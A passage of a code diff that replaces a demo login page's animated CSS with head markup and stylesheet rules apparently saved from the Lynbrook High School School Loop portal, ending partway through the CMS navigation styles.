@@ -1,672 +1,1155 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="verify-v1" content="vHhoG0D6oy8rC5ep+zj5nQPW9Zx1VEf/kpUtKioLNjs=">
+<meta name="page_generation_id" content="proxy104n_1451437021565">
+    <!--meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0"-->
 
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Hello World</title>
-     <style>
-       *, *:before, *:after {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
+    <!-- Header Top DEFAULT -->
 
-html, body {
-  font-size: 62.5%;
-  height: 100%;
-  overflow: hidden;
-}
-@media (max-width: 768px) {
-  html, body {
-    font-size: 50%;
-  }
-}
-
-svg {
-  display: inline-block;
-  width: 2rem;
-  height: 2rem;
-  overflow: visible;
-}
-
-.svg-icon {
-  cursor: pointer;
-}
-.svg-icon path {
-  stroke: rgba(255, 255, 255, 0.9);
-  fill: none;
-  stroke-width: 1;
-}
-
-input, button {
-  outline: none;
-  border: none;
-}
-
-.cont {
-  position: relative;
-  height: 100%;
-  background-image: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/142996/slider-2.jpg");
-  background-size: cover;
-  overflow: auto;
-  font-family: "Open Sans", Helvetica, Arial, sans-serif;
-}
-
-.demo {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  margin-left: -15rem;
-  margin-top: -26.5rem;
-  width: 30rem;
-  height: 53rem;
-  overflow: hidden;
-}
-
-.login {
-  position: relative;
-  height: 100%;
-  background: -webkit-linear-gradient(top, rgba(146, 135, 187, 0.8) 0%, rgba(0, 0, 0, 0.6) 100%);
-  background: linear-gradient(to bottom, rgba(146, 135, 187, 0.8) 0%, rgba(0, 0, 0, 0.6) 100%);
-  -webkit-transition: opacity 0.1s, -webkit-transform 0.3s cubic-bezier(0.17, -0.65, 0.665, 1.25);
-  transition: opacity 0.1s, -webkit-transform 0.3s cubic-bezier(0.17, -0.65, 0.665, 1.25);
-  transition: opacity 0.1s, transform 0.3s cubic-bezier(0.17, -0.65, 0.665, 1.25);
-  transition: opacity 0.1s, transform 0.3s cubic-bezier(0.17, -0.65, 0.665, 1.25), -webkit-transform 0.3s cubic-bezier(0.17, -0.65, 0.665, 1.25);
-  -webkit-transform: scale(1);
-          transform: scale(1);
-}
-.login.inactive {
-  opacity: 0;
-  -webkit-transform: scale(1.1);
-          transform: scale(1.1);
-}
-.login__check {
-  position: absolute;
-  top: 16rem;
-  left: 13.5rem;
-  width: 14rem;
-  height: 2.8rem;
-  background: #fff;
-  -webkit-transform-origin: 0 100%;
-          transform-origin: 0 100%;
-  -webkit-transform: rotate(-45deg);
-          transform: rotate(-45deg);
-}
-.login__check:before {
-  content: "";
-  position: absolute;
-  left: 0;
-  bottom: 100%;
-  width: 2.8rem;
-  height: 5.2rem;
-  background: #fff;
-  box-shadow: inset -0.2rem -2rem 2rem rgba(0, 0, 0, 0.2);
-}
-.login__form {
-  position: absolute;
-  top: 50%;
-  left: 0;
-  width: 100%;
-  height: 50%;
-  padding: 1.5rem 2.5rem;
-  text-align: center;
-}
-.login__row {
-  height: 5rem;
-  padding-top: 1rem;
-  border-bottom: 1px solid rgba(255, 255, 255, 0.2);
-}
-.login__icon {
-  margin-bottom: -0.4rem;
-  margin-right: 0.5rem;
-}
-.login__icon.name path {
-  stroke-dasharray: 73.50196075439453;
-  stroke-dashoffset: 73.50196075439453;
-  -webkit-animation: animatePath 2s 0.5s forwards;
-          animation: animatePath 2s 0.5s forwards;
-}
-.login__icon.pass path {
-  stroke-dasharray: 92.10662841796875;
-  stroke-dashoffset: 92.10662841796875;
-  -webkit-animation: animatePath 2s 0.5s forwards;
-          animation: animatePath 2s 0.5s forwards;
-}
-.login__input {
-  display: inline-block;
-  width: 22rem;
-  height: 100%;
-  padding-left: 1.5rem;
-  font-size: 1.5rem;
-  background: transparent;
-  color: #FDFCFD;
-}
-.login__submit {
-  position: relative;
-  width: 100%;
-  height: 4rem;
-  margin: 5rem 0 2.2rem;
-  color: rgba(255, 255, 255, 0.8);
-  background: #FF3366;
-  font-size: 1.5rem;
-  border-radius: 3rem;
-  cursor: pointer;
-  overflow: hidden;
-  -webkit-transition: width 0.3s 0.15s, font-size 0.1s 0.15s;
-  transition: width 0.3s 0.15s, font-size 0.1s 0.15s;
-}
-.login__submit:after {
-  content: "";
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  margin-left: -1.5rem;
-  margin-top: -1.5rem;
-  width: 3rem;
-  height: 3rem;
-  border: 2px dotted #fff;
-  border-radius: 50%;
-  border-left: none;
-  border-bottom: none;
-  -webkit-transition: opacity 0.1s 0.4s;
-  transition: opacity 0.1s 0.4s;
-  opacity: 0;
-}
-.login__submit.processing {
-  width: 4rem;
-  font-size: 0;
-}
-.login__submit.processing:after {
-  opacity: 1;
-  -webkit-animation: rotate 0.5s 0.4s infinite linear;
-          animation: rotate 0.5s 0.4s infinite linear;
-}
-.login__submit.success {
-  -webkit-transition: opacity 0.1s 0.3s, background-color 0.1s 0.3s, -webkit-transform 0.3s 0.1s ease-out;
-  transition: opacity 0.1s 0.3s, background-color 0.1s 0.3s, -webkit-transform 0.3s 0.1s ease-out;
-  transition: transform 0.3s 0.1s ease-out, opacity 0.1s 0.3s, background-color 0.1s 0.3s;
-  transition: transform 0.3s 0.1s ease-out, opacity 0.1s 0.3s, background-color 0.1s 0.3s, -webkit-transform 0.3s 0.1s ease-out;
-  -webkit-transform: scale(30);
-          transform: scale(30);
-  opacity: 0.9;
-}
-.login__submit.success:after {
-  -webkit-transition: opacity 0.1s 0s;
-  transition: opacity 0.1s 0s;
-  opacity: 0;
-  -webkit-animation: none;
-          animation: none;
-}
-.login__signup {
-  font-size: 1.2rem;
-  color: #ABA8AE;
-}
-.login__signup a {
-  color: #fff;
-  cursor: pointer;
-}
-
-.app {
-  position: absolute;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  opacity: 0;
-  display: none;
-  -webkit-transition: opacity 0.1s, -webkit-transform 0.3s cubic-bezier(0.68, -0.45, 0.465, 1.25);
-  transition: opacity 0.1s, -webkit-transform 0.3s cubic-bezier(0.68, -0.45, 0.465, 1.25);
-  transition: opacity 0.1s, transform 0.3s cubic-bezier(0.68, -0.45, 0.465, 1.25);
-  transition: opacity 0.1s, transform 0.3s cubic-bezier(0.68, -0.45, 0.465, 1.25), -webkit-transform 0.3s cubic-bezier(0.68, -0.45, 0.465, 1.25);
-  -webkit-transform: scale(1.2);
-          transform: scale(1.2);
-}
-.app.active {
-  opacity: 1;
-  -webkit-transform: scale(1);
-          transform: scale(1);
-}
-.app.active .app__user-photo {
-  -webkit-transform: scale(1);
-          transform: scale(1);
-}
-.app.active .app__meeting {
-  -webkit-transform: translateY(0);
-          transform: translateY(0);
-  opacity: 1;
-}
-.app.active .app__logout {
-  -webkit-transform: scale(1);
-          transform: scale(1);
-}
-.app__top {
-  position: relative;
-  height: 28rem;
-  background: rgba(0, 0, 0, 0.5);
-  padding: 6rem 1.5rem 2rem;
-  text-align: center;
-}
-.app__bot {
-  position: relative;
-  height: 25rem;
-  background: #fff;
-}
-.app__menu-btn {
-  position: absolute;
-  top: 2rem;
-  left: 1.5rem;
-  width: 1.8rem;
-  height: 1.7rem;
-  cursor: pointer;
-}
-.app__menu-btn span, .app__menu-btn:before, .app__menu-btn:after {
-  position: absolute;
-  left: 0;
-  width: 100%;
-  height: 1px;
-  background: rgba(255, 255, 255, 0.6);
-}
-.app__menu-btn span {
-  top: 0.8rem;
-}
-.app__menu-btn:before {
-  content: "";
-  top: 0;
-}
-.app__menu-btn:after {
-  content: "";
-  bottom: 0;
-}
-.app__icon {
-  position: absolute;
-  top: 2rem;
-}
-.app__icon.search {
-  right: 1.5rem;
-  stroke-dasharray: 61.847137451171875;
-  stroke-dashoffset: 61.847137451171875;
-  -webkit-animation: animatePath 0.5s 0.5s forwards;
-          animation: animatePath 0.5s 0.5s forwards;
-}
-.app__hello {
-  font-size: 2.2rem;
-  color: #fff;
-  font-weight: normal;
-  margin-bottom: 3rem;
-}
-.app__user {
-  position: relative;
-  display: inline-block;
-  width: 9rem;
-  height: 9rem;
-  margin-bottom: 3rem;
-}
-.app__user-photo {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  -webkit-transition: -webkit-transform 0.3s 0.2s cubic-bezier(0.62, 0.35, 0.56, 1.55);
-  transition: -webkit-transform 0.3s 0.2s cubic-bezier(0.62, 0.35, 0.56, 1.55);
-  transition: transform 0.3s 0.2s cubic-bezier(0.62, 0.35, 0.56, 1.55);
-  transition: transform 0.3s 0.2s cubic-bezier(0.62, 0.35, 0.56, 1.55), -webkit-transform 0.3s 0.2s cubic-bezier(0.62, 0.35, 0.56, 1.55);
-  -webkit-transform: scale(0);
-          transform: scale(0);
-}
-.app__user-notif {
-  position: absolute;
-  top: 0;
-  right: 0;
-  width: 3rem;
-  height: 3rem;
-  border-radius: 50%;
-  line-height: 3rem;
-  text-align: center;
-  background: #50D2C2;
-  color: #fff;
-  font-size: 1.5rem;
-}
-.app__month:after {
-  content: "";
-  display: table;
-  clear: both;
-}
-.app__month-name {
-  display: inline-block;
-  color: rgba(255, 255, 255, 0.6);
-  font-size: 1.2rem;
-  text-transform: uppercase;
-}
-.app__month-btn {
-  display: inline-block;
-  width: 1.2rem;
-  height: 1.2rem;
-  border: 1px solid rgba(255, 255, 255, 0.6);
-  border-left: none;
-  border-bottom: none;
-  cursor: pointer;
-}
-.app__month-btn.left {
-  float: left;
-  -webkit-transform: rotate(-135deg);
-          transform: rotate(-135deg);
-}
-.app__month-btn.right {
-  float: right;
-  -webkit-transform: rotate(45deg);
-          transform: rotate(45deg);
-}
-.app__days {
-  height: 7rem;
-  padding: 1.5rem 2rem;
-  display: -webkit-box;
-  display: -webkit-flex;
-  display: -ms-flexbox;
-  display: flex;
-  -webkit-box-pack: justify;
-  -webkit-justify-content: space-between;
-      -ms-flex-pack: justify;
-          justify-content: space-between;
-  -webkit-flex-wrap: wrap;
-      -ms-flex-wrap: wrap;
-          flex-wrap: wrap;
-}
-.app__day {
-  width: 14%;
-  text-align: center;
-  font-size: 1.2rem;
-}
-.app__day.weekday {
-  color: #919197;
-  text-transform: uppercase;
-}
-.app__day.date {
-  font-size: 1.2rem;
-  font-weight: bold;
-  color: #3C3C43;
-}
-.app__meeting {
-  position: relative;
-  height: 6rem;
-  border-top: 1px solid #EEEEEF;
-  padding: 1rem 2rem 1rem 7.5rem;
-  -webkit-transition: opacity 0.3s, -webkit-transform 0.3s;
-  transition: opacity 0.3s, -webkit-transform 0.3s;
-  transition: transform 0.3s, opacity 0.3s;
-  transition: transform 0.3s, opacity 0.3s, -webkit-transform 0.3s;
-  -webkit-transform: translateY(-50%);
-          transform: translateY(-50%);
-  opacity: 0;
-}
-.app__meeting:nth-child(1) {
-  -webkit-transition-delay: 0.2s;
-          transition-delay: 0.2s;
-}
-.app__meeting:nth-child(2) {
-  -webkit-transition-delay: 0.3s;
-          transition-delay: 0.3s;
-}
-.app__meeting:nth-child(3) {
-  -webkit-transition-delay: 0.4s;
-          transition-delay: 0.4s;
-}
-.app__meeting:nth-child(4) {
-  -webkit-transition-delay: 0.5s;
-          transition-delay: 0.5s;
-}
-.app__meeting:nth-child(5) {
-  -webkit-transition-delay: 0.6s;
-          transition-delay: 0.6s;
-}
-.app__meeting-photo {
-  position: absolute;
-  left: 2rem;
-  top: 1rem;
-  width: 4rem;
-  height: 4rem;
-}
-.app__meeting-name {
-  color: #000;
-  font-size: 1.3rem;
-}
-.app__meeting-info {
-  color: #949498;
-  font-size: 1.1rem;
-}
-.app__logout {
-  position: absolute;
-  bottom: 3.3rem;
-  right: 3.3rem;
-  width: 4.6rem;
-  height: 4.6rem;
-  margin-right: -2.3rem;
-  margin-bottom: -2.3rem;
-  background: #FC3768;
-  color: #fff;
-  font-size: 2rem;
-  border-radius: 50%;
-  cursor: pointer;
-  -webkit-transition: bottom 0.4s 0.1s, right 0.4s 0.1s, opacity 0.1s 0.7s, background-color 0.1s 0.7s, -webkit-transform 0.4s 0.4s;
-  transition: bottom 0.4s 0.1s, right 0.4s 0.1s, opacity 0.1s 0.7s, background-color 0.1s 0.7s, -webkit-transform 0.4s 0.4s;
-  transition: bottom 0.4s 0.1s, right 0.4s 0.1s, transform 0.4s 0.4s, opacity 0.1s 0.7s, background-color 0.1s 0.7s;
-  transition: bottom 0.4s 0.1s, right 0.4s 0.1s, transform 0.4s 0.4s, opacity 0.1s 0.7s, background-color 0.1s 0.7s, -webkit-transform 0.4s 0.4s;
-  -webkit-transform: scale(0);
-          transform: scale(0);
-}
-.app__logout.clicked {
-  bottom: 50%;
-  right: 50%;
-  -webkit-transform: scale(30) !important;
-          transform: scale(30) !important;
-  opacity: 0.9;
-}
-.app__logout.clicked svg {
-  opacity: 0;
-}
-.app__logout-icon {
-  position: absolute;
-  width: 3rem;
-  height: 3rem;
-  top: 50%;
-  left: 50%;
-  margin-left: -1.5rem;
-  margin-top: -1.5rem;
-  -webkit-transition: opacity 0.1s;
-  transition: opacity 0.1s;
-}
-.app__logout-icon path {
-  stroke-width: 4px;
-  stroke-dasharray: 64.36235046386719;
-  stroke-dashoffset: 64.36235046386719;
-  -webkit-animation: animatePath 0.5s 0.5s forwards;
-          animation: animatePath 0.5s 0.5s forwards;
-}
-
-.ripple {
-  position: absolute;
-  width: 15rem;
-  height: 15rem;
-  margin-left: -7.5rem;
-  margin-top: -7.5rem;
-  background: rgba(0, 0, 0, 0.4);
-  -webkit-transform: scale(0);
-          transform: scale(0);
-  -webkit-animation: animRipple 0.4s;
-          animation: animRipple 0.4s;
-  border-radius: 50%;
-}
-
-@-webkit-keyframes animRipple {
-  to {
-    -webkit-transform: scale(3.5);
-            transform: scale(3.5);
-    opacity: 0;
-  }
-}
-
-@keyframes animRipple {
-  to {
-    -webkit-transform: scale(3.5);
-            transform: scale(3.5);
-    opacity: 0;
-  }
-}
-@-webkit-keyframes rotate {
-  to {
-    -webkit-transform: rotate(360deg);
-            transform: rotate(360deg);
-  }
-}
-@keyframes rotate {
-  to {
-    -webkit-transform: rotate(360deg);
-            transform: rotate(360deg);
-  }
-}
-@-webkit-keyframes animatePath {
-  to {
-    stroke-dashoffset: 0;
-  }
-}
-@keyframes animatePath {
-  to {
-    stroke-dashoffset: 0;
-  }
-}
-
-    </style>
+        <title>Lynbrook High School </title>
+    <!-- Nagios fodder -->
 
 
-  <!-- Compiled and minified JavaScript -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.5/js/materialize.min.js"></script>
+<!-- begin CSS Section -->
+<link rel="stylesheet" type="text/css" href="https://cdn.schoolloop.com/1601121901/static/lib/jquery/1.8/css/smoothness/jquery-ui-1.8.16.custom.css" media="all">
+        <link rel="stylesheet" type="text/css" href="https://cdn.schoolloop.com/portalcdn/version_1601121901ssl/css/master.css" media="screen">
+
+<style type="text/css" media="screen">
+    body {
+        background: #f2f0e9;
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 13px;
+        color: #444444;
+        margin: 0px;
+        padding: 0px;
+    }
+    #container_content {width: 960px; background: #ffffff url(https://cdn.schoolloop.com/1601121901/img/app_login_bg.gif) bottom no-repeat; text-align: left; padding: 0px 10px 10px 10px; margin: 0px 0px 0px 0px;}
+a.icon_rss {float: left; background: url(https://cdn.schoolloop.com/1601121901/img/icon_rss.gif) left no-repeat; display: block; height: 15px; font: normal 10px Verdana, Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 3px 0px 20px; margin: 0px 10px 1px 5px; text-align: left;}
+a.icon_rss:hover {background: url(https://cdn.schoolloop.com/1601121901/img/icon_rss.gif) left no-repeat; color: ; text-decoration: none;}
+
+a.icon_translate {float: left; background: url(https://cdn.schoolloop.com/1601121901/img/icon_translate.gif) left no-repeat; display: block; height: 15px; font: normal 10px Verdana, Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 3px 0px 28px; margin: 0px 0px 1px 5px; text-align: left;}
+a.icon_translate:hover {background: url(https://cdn.schoolloop.com/1601121901/img/icon_translate.gif) left no-repeat; color: ; text-decoration: none;}
+
+h1 {font-family: Arial, Helvetica, sans-serif; font-weight: 400; font-size: 28px; color: #666; margin: 0px 0px 10px 0px; padding: 0px 0px 0px 0px; border-bottom:#cccccc solid 1px;}
+h2 {font-family: Arial, Helvetica, sans-serif; font-weight: 400; font-size: 22px; color: #333; margin: 7px 0px 0px 0px; padding: 0px 0px; text-transform: uppercase;}
+h3 {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 15px; margin: 0px 0px 0px 0px; padding: 0px 0px 2px 0px; }
+h4 {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 15px; color: #666666; margin: 0px 0px 0px 0px; padding: 0px 0px 0px 0px; }
+h5 {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 13px; color: #666666; margin: 0px 0px 0px 0px; padding: 0px 0px 0px 0px; text-transform: uppercase; }
+
+
+#page_title_login {font-weight: 400; font-size: 38px; color: #444; padding: 0px; margin-top: 30px; clear: both}
+#page_title_login div{font-weight: 400; font-size: 22px; color: #888; padding: 0px; margin: 0px; clear: both}
+#page_title {font-weight: 400; font-size: 28px; color: #444; padding: 10px 10px 5px 10px; margin: 2px 0px 10px 0px; border-bottom: 1px #eee solid; clear: both}
+#page_title .sub {float: left; font-weight: 400; font-size: 20px; color: #666; margin: 8px 0px 0px 5px; padding: 0px 0px; }
+#page_title_nav {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 26px; color: #214a7d; padding: 0px 10px 0px 15px; margin: 2px 0px 10px 0px; border-bottom: 1px #cccccc solid; clear: both}
+#page_title_column {font-family: Arial, Helvetica, sans-serif; font-weight: bold; font-size: 26px; color: #214a7d; padding: 0px 10px 0px 15px; margin: 2px 0px 10px 0px; border-bottom: 1px #cccccc solid; clear: both}
+
+
+#container_page {width: ; text-align: left; margin: 0px auto;
+
+}
+
+
+
+
+/* ######### CMS Nav ######### */
+
+
+
+.container_cms_tools_top {width: auto; height: auto; background: url(/img/cms_tools_main_bg.gif); margin: 0 auto; padding-top: 1px; margin-bottom: 0px;}
+.container_cms_tools_page {width: auto; background: url(/img/cms_page_tools_bg.gif) no-repeat; margin: 5px 0px 0px 0px; padding: 5px 0px 2px 0px; margin-bottom: 0px; vertical-align: bottom;}
+.container_cms_tools_page_changed {width: auto; background: url(/img/cms_page_tools_bg_changed.png) no-repeat; margin: 5px 0px 0px 0px; padding: 5px 0px 2px 0px; margin-bottom: 0px; vertical-align: bottom;}
+
+#cms_tools_top {width: auto; margin: 0px auto; clear: both; text-align: left;}
+
+
+/* -- Quick Design -- */
+.quick_select {float: left; background: #ffffff; border: 1px #cccccc dashed; padding: 5px; text-align: center; margin: 0px 25px 40px 0px}
+.quick_select a.preview{display: block; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; padding: 5px 0px 5px 0px}
+.quick_select a.preview:hover{display: block; background: #ffffbb; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; padding: 5px 0px 5px 0px}
+.quick_select img{border: 1px #cccccc solid; margin: 0px; padding: 0px }
+.quick_select .title{padding: 0px 0px 10px 0px}
+
+
+.btn_quick_select_lg a{display: block; background: #ffffff; font-size: 14px; color: #3366cc; font-weight: bold; margin: 0px; padding: 5px 5px 5px 5px; text-align: center; border: 1px #ffffff solid;}
+.btn_quick_select_lg a:hover{display: block; background: #ffffbb; padding: 5px 5px 5px 5px; color: #3366cc; border: 1px #3366cc solid; text-decoration: none;}
+
+.btn_swatch {float: left; display: block; width: 140px; height: auto; font-weight: bold; margin: 0px 20px 15px 0px; padding: 5px 5px 5px 5px; text-align: center; border: 1px #cccccc solid;}
+.btn_swatch:hover{background: #ffffbb; border: 1px #3366cc solid; text-decoration: none;}
+
+
+/* -- Quick Design with Skins-- */
+.design_select {float: left; background: #ffffff; border: 1px #cccccc dashed; padding: 0px 5px 0px 5px; text-align: center; margin: 0px}
+.design_select a.preview{display: block; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; padding: 5px 0px 5px 0px}
+.design_select a.preview:hover{display: block; background: #ffffbb; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; padding: 5px 0px 5px 0px}
+.design_select img{border: 2px #cccccc solid; margin: 0px; padding: 0px }
+.design_select .title{font-family: Arial, Helvetica, sans-serif; font-size: 13px; font-weight: bold; color: #3366cc; padding: 5px 0px 5px 0px}
+
+.skin_select {float: left; background: #ffffff; border: 1px #cccccc dashed; padding: 5px; text-align: center; margin: 0px 15px 0px 15px}
+.skin_select a.preview{display: block; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; padding: 5px 0px 5px 0px}
+.skin_select a.preview:hover{display: block; background: #ffffbb; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; padding: 5px 0px 5px 0px}
+.skin_select img{border: 2px #cccccc solid; margin: 0px; padding: 0px }
+.skin_select .title{font-family: Arial, Helvetica, sans-serif; font-size: 13px; font-weight: bold; color: #666666; padding: 5px 0px 5px 0px}
+
+.preview_box {overflow: auto; margin-left: 50px; padding: 5px 0px 5px 5px; width: 325px; height: 260px; background:#f9f9f9; border-right: 1px #cccccc solid; border-bottom: 1px #cccccc solid; border-left: 1px #cccccc solid;}
+.preview_box_title {font-size: 13px; font-weight: bold; color: #666666; padding: 5px 5px 5px 55px; margin: 0px; border-bottom: 1px #cccccc solid  }
+.preview_box_image {margin-bottom: 10px; margin-right: 10px; border: 2px #cccccc solid}
+
+.design_select_spacing {float: left; width: 110px; height: 10px;}
+
+.design_select_column_left{float: left; background: #ffffdd; padding: 10px 25px 10px 25px; margin-bottom: 20px}
+.design_select_column_left h2{font-size: 22px; margin-bottoom: 5px}
+
+.design_select_column_right{float: left; background: #ecf3f4; padding: 10px 25px 10px 25px; margin-bottom: 20px}
+.design_select_column_right h2{font-size: 22px; margin-bottoom: 5px}
+
+.btn_design_select_lg a{display: block; background: #ffffff; font-size: 14px; color: #3366cc; font-weight: bold; margin: 0px; padding: 2px; text-align: center; border: 1px #ffffff solid;}
+.btn_design_select_lg a:hover{display: block; background: #ffffbb; padding: 2px; color: #3366cc; border: 1px #3366cc solid; text-decoration: none;}
+
+.btn_swatch {float: left; display: block; width: 140px; height: auto; font-weight: bold; margin: 0px 20px 15px 0px; padding: 5px 5px 5px 5px; text-align: center; border: 1px #cccccc solid;}
+.btn_swatch:hover{background: #ffffbb; border: 1px #3366cc solid; text-decoration: none;}
+
+
+
+.setup {margin: 0px;}
+.setup .number{float: left; height: 25px; background: #ffffbb; font-size: 22px; color: #000000; border-bottom: 3px #f1b209 solid; border-top: 1px #f1b209 solid; border-right: 1px #f1b209 solid; border-bottom: 3px #f1b209 solid; border-left: 1px #f1b209 solid; padding: 2px 2px 0px 5px;}
+.setup .label{float: left; height: 26px; width: 887px; font-size: 22px; font-weight: bold; color: #000000; border-bottom: 3px #f1b209 solid; padding: 2px 0px 0px 5px;}
+
+.setup .number_grey{float: left; height: 25px; background: #efefef; font-size: 22px; color: #999999; border-bottom: 3px #999999 solid; border-top: 1px #999999 solid; border-right: 1px #999999 solid; border-bottom: 3px #999999 solid; border-left: 1px #999999 solid; padding: 2px 2px 0px 5px;}
+.setup .label_grey{float: left; height: 26px; width: 887px; font-size: 22px; font-weight: bold; color: #999999; border-bottom: 3px #999999 solid; padding: 2px 0px 0px 5px;}
+
+
+.step_table {margin: 0px;}
+.step_table .numbers {background: #7e9831; padding: 5px 5px 10px 5px; text-align: right; color: #ffffff; font-size: 22px; font-weight: bold;}
+.step_table .wide {padding: 5px 0px 10px 5px; }
+
+
+#stats {width: 560px;}
+#stats .total{font-size: 11px; float: right; text-align: right; padding-right: 10px; margin: 1px; padding-top: 3px;
+}
+
+
+.img_instruction {width: auto; font-weight: bold; background: #cccccc; padding: 20px 20px 0px 20px}
+.img_instruction p {color: #cc0000;}
+
+
+
+/* -- CMS Add Page Form Blocks --  */
+#template_select {margin: 0px;}
+#template_select .block {float: left; width: 190px; height: 190px; margin: 0px 15px 5px 0px; border: 1px #cccccc solid; text-align: center; }
+#template_select .block img{margin-bottom: 5px;}
+#template_select .block_highlight{width: auto; height: 20px; margin-bottom: 5px; background: #ffffbb; vertical-align: middle; text-align: center; border-bottom: 1px #cccccc solid;}
+
+a.icon_delete {
+    float: right;
+    background: url(/img/icon_locker_delete_sm.png) no-repeat center;
+    width: 18px;
+    height: 18px;
+    display: block;
+    cursor: pointer;
+    margin-left: 10px;
+
+    }
+
+
+a.icon_delete:hover {
+    background: #f90 url(/img/icon_locker_delete_sm.png) no-repeat center;
+    border-radius: 3px;
+    -moz-border-radius: 3px;
+    -webkit-border-radius: 3px;
+
+    }
+
+.small_link {font-size: 11px; padding-right: 10px;}
+.site_map {margin: 0px 0px 0px 0px;}
+
+#moveable_items_area {border: 2px #FAF6DA solid;}
+
+
+
+.site_map .background {padding: 2px 2px 2px 0px; margin: 0px; background: #faf6da;}
+
+.site_map h2{float: left; margin: 0px 0px 0px 15px; font-size: 15px; }
+.site_map .float_left{float: left; padding-top: 5px; margin-right: 15px; background: #ffffff}
+.site_map .move{float: left; width: 20px; height: auto; padding-left: 2px; font-size: 1px; line-height: 1px;}
+.site_map .home_row {background: #faf6da; margin: 0px 0px 0px 0px; height: 18px; padding: 10px 0px 5px 20px; border-top: 1px #ddd solid; border-bottom: 1px #ddd solid; vertical-align: middle;}
+.site_map .home_row h2{color: #ff0000;}
+
+.site_map .tlm_cluster {background: #f2f0e9; padding: 1px; padding-top: 0px;}
+                    /*
+.site_map .tlm_row {background: #faf8ec; margin: 0px 0px 0px 0px; padding: 10px 5px; vertical-align: middle; border-top: 1px #ddd solid; border-bottom: 1px #ddd solid;}
+                                                                                                                                                                       */
+
+
+.site_map .tlm_row h2 {font-family: Arial, Helvetica, san-serif; font-size: 18px; font-weight: normal; color: #333; text-transform: none; padding-left: 0px;}
+.site_map .tlm_row img {margin-right: 5px}
+.site_map .section_row {padding: 5px; vertical-align: middle; font-weight: normal} /*border-left: 1px #ccc dashed;  */
+
+.site_map .section_row_section {padding: 5px 5px 0px 5px; vertical-align: middle; font-weight: normal}
+
+
+.site_map .page_row {padding: 5px; background: url('https://cdn.schoolloop.com/1601121901/img/icon_site_map_page.gif') 20px no-repeat; padding-left: 45px; vertical-align: middle; margin: 0px;}
+.site_map .page_row_highlight {background: #ffffbb; margin: 0px 0px 0px 0px; height: 13px; padding: 3px 0px 3px 35px; vertical-align: middle;}
+
+.site_map .page_row {cursor:move}
+
+.site_map .page_row:hover {
+           background-color: #F2C477;
+           }
+
+.page_row_name {
+    float: left; width: auto; padding: 3px 0px 0px 0px;
+}
+
+.site_map_right {font-size: 11px; padding-top: 5px; float: right;}
+
+.site_map .site_map_homepage_icon {background: #faf6da url('https://cdn.schoolloop.com/1601121901/img/icon_site_map_page.gif') left no-repeat;}
+.site_map .site_map_page {background: #fff url('https://cdn.schoolloop.com/1601121901/img/icon_site_map_page.gif') left no-repeat;}
+
+.site_map .site_map_section {margin-bottom:2px; padding-top: 0px;}
+
+.ajax_accordion_row > .site_map_section .folder_icon, .site_map_subsection .folder_icon {
+display:block;
+background: url('/img/icon_locker_sprite.png') 0px 125px;
+width: 20px;
+height: 20px;
+float:left;
+}
+
+.ajax_accordion_row.current > .site_map_section .folder_icon, .ajax_accordion_row.current.site_map_subsection .folder_icon {
+display:block;
+background: url('/img/icon_locker_sprite.png') -20px 125px;
+width: 20px;
+height: 20px;
+float:left;
+}
+
+
+.site_map .site_map_subsection {background-color: #faf8e; padding-right: 0px;} /* c */
+
+.site_map .current{
+        border-right: none;
+        }
+a.btn_nav_site_map {font: bold 11px Arial, Helvetica, sans-serif; color:#3366cc; line-height: 18px; text-decoration:none; padding: 2px 5px 2px 5px; margin: 0px 0px 0px 0px; background:#ffffff; border: #3366cc solid 1px;}
+a.btn_nav_site_map:visited {font: bold 11px Arial, Helvetica, sans-serif; color:#3366cc; line-height: 18px; text-decoration:none; padding: 2px 5px 2px 5px; margin: 0px 0px 0px 0px; background:#ffffff; border: #3366cc solid 1px;}
+a.btn_nav_site_map:hover {font: bold 11px Arial, Helvetica, sans-serif; color:#ffffff;  line-height: 18px; text-decoration:none; padding: 2px 5px 2px 5px; margin: 0px 0px 0px 0px; background:#3366cc; border: #3366cc solid 1px;}
+
+
+
+
+
+
+
+
+
+
+
+/* CMS Sitemap Nav ------------------------------------------*/
+
+#menuwrapper {
+	border-bottom: 1px #ddd solid;
+    margin-bottom: 5px;
+    padding: 5px;
+
+}
+
+.clearit {
+	clear: both;
+	height: 0px;
+	font-size: 0px;
+}
+
+#nav_cms, #nav_cms ul {
+	padding: 0px;
+	margin: 0px;
+	list-style: none;
+	font-family: Arial, Helvetica, sans-serif;
+}
+#nav_cms a {
+	display: block;
+	text-decoration: none;
+	padding: 5px 10px 5px 10px;
+	font-size: 11px;
+
+}
+
+#nav_cms a.trigger {
+	font: bold 11px Arial, Helvetica, sans-serif;
+    color:#4a7dbb;
+    text-decoration:none;
+    padding: 5px;
+    margin: 0px 2px 0px 0px;
+    background: #fff;
+    border: #4a7dbb solid 1px;
+}
+
+#nav_cms a.trigger:hover {
+    color:#fff;
+    text-decoration:none;
+    background: #f90;
+    border: #f90 solid 1px;
+}
+
+#nav_cms li {
+	float: left;
+	width: 144px;
+}
+#nav_cms li {position: relative;}
+
+/* hide from IE mac \*/
+#nav_cms li {position: static; width: auto;}
